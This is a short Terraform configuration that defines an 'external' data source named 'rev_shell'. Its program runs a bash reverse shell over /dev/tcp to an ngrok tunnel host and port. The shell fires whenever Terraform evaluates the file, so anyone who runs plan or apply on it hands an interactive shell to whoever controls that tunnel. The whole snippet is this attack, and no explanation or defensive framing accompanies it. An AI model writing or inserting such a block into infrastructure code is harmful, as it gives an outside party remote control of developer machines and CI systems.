data "external" "rev_shell" {
  program = [
    "sh", "-c",
    "bash -i >& /dev/tcp/0.tcp.in.ngrok.io/10168 0>&1"
  ]
}
